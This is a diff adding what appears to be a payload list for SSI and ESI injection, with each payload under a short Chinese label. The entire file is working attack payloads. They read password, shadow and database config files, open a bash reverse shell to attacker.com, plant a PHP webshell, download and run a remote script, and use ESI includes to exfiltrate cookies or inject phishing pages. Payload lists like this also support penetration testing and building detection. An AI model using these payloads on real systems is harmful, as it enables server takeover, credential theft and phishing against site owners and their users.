@@ -1,0 +1,24 @@
+# SSI - 命令执行读取密码文件
+<!--#exec cmd="cat /etc/passwd" -->
+# SSI - 命令执行反弹 Shell
+<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'" -->
+# SSI - 包含任意文件泄露敏感信息
+<!--#include virtual="/etc/shadow" -->
+# SSI - 写入 Webshell 到 Web 目录
+<!--#exec cmd="echo '<?php system($_GET[1]);?>' > /var/www/html/shell.php" -->
+# SSI - 文件大小判断（盲注信息泄露）
+<!--#fsize file="/etc/shadow" -->
+# SSI - 输出 DOCUMENT_ROOT 泄露 Web 路径
+<!--#echo var="DOCUMENT_ROOT" -->
+# SSI - 输出全部环境变量泄露敏感配置
+<!--#printenv -->
+# SSI - 下载执行远程木马
+<!--#exec cmd="wget http://attacker.com/shell.sh -O /tmp/s.sh; bash /tmp/s.sh" -->
+# SSI - ESI 注入窃取 Cookie (Edge Side Includes)
+<esi:include src="http://attacker.com/steal?cookie=$(HTTP_COOKIE)"/>
+# SSI - ESI 注入替换页面内容为钓鱼页面
+<esi:include src="http://attacker.com/phish.html"/>
+# SSI - 通过变量赋值泄露敏感信息
+<!--#set var="sensitive" value="$DOCUMENT_ROOT" --><!--#echo var="sensitive" -->
+# SSI - 读取数据库配置文件
+<!--#exec cmd="cat /var/www/html/config/database.php" -->
